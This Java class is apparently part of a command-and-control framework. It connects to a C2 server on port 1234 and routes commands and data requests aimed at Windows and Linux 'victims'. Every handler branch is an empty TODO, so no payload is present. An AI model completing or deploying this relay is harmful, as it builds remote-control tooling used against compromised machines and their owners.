package Servers.Beacon;

import java.io.IOException;
import java.net.Socket;

import Servers.Duplexer;

public class BeaconC2Handler implements Runnable{
    // Pointer to the Long Range Beacon Server that interacts with the clients (victims)
    private BeaconServer beaconServer;
    // Pointer to the C2 Server that the user interacts with the user
    private Duplexer C2Server;

    /**
     * This starts a thread that sends and receives messages with the C2 Server
     * 
     * This thread then interacts with the Long Range Beacon Server, the Long Range Beacon
     * Server then interacts with all of the clients (victims)
     * 
     * @param beaconServer The Long Range Beacon Server
     * @param C2ServerIPAddress The IP Address of the C2 Server
     * @throws IOException
     */
    public BeaconC2Handler(BeaconServer beaconServer, String C2ServerIPAddress) throws IOException{
        this.beaconServer = beaconServer;
        Socket socket = new Socket(C2ServerIPAddress, 1234);
        this.C2Server = new Duplexer(socket);
    }

    /**
     * Function meant to be used by the Long Range Beacon Server
     * to send data back to the C2 Server when it's requested
     * 
     * @param Data The Data to be sent back to the C2 Server
     */
    protected void sendDataToC2Server(String Data){
        C2Server.send(Data);
    }

    @Override
    public void run(){
        /**
         * Commands from the C2 Server are organized in a hierarchical structure
         * Command to be sent to Computer
         *      Either Windows or Linux
         *          All Computers, or specific computer
         * Request for Data from the Long Range Beacon
         *      Client Responses
         *          Either Windows or Linux
         *              All computers, or specific computer
         *      Client Status Updates
         *          All, Windows, Linux, or Specific Computer
         */
        while(true){
            try{
                String message = C2Server.receive();
                String[] tokens = message.split(" ");
                if(tokens[0].equals("Command")){
                    if(tokens[1].equals("Windows")){
                        if(tokens[2].equals("All")){
                            // TODO
                        }else{
                            // TODO
                        }
                    }else if(tokens[1].equals("Linux")){
                        if(tokens[2].equals("All")){
                            // TODO
                        }else{
                            // TODO
                        }
                    }
                }else if(tokens[0].equals("Request")){
                    if(tokens[1].equals("ClientData")){
                        if(tokens[2].equals("Windows")){
                            if(tokens[3].equals("All")){
                                // TODO
                            }else{
                                // TODO
                            }
                        }else if(tokens[2].equals("Linux")){
                            if(tokens[3].equals("All")){
                                // TODO
                            }
                            else{
                                // TODO
                            }
                        }
                    }else if(tokens[1].equals("ClientStatus")){
                        if(tokens[2].equals("All")){
                            // TOOD
                        }else if(tokens[2].equals("Windows")){
                            // TODO
                        }else if(tokens[2].equals("Linux")){
                            // TODO
                        }else{
                            // TODO
                        }

                    }
                }
                
            } catch(IOException e){
                e.printStackTrace();
            }
        }
    }
}
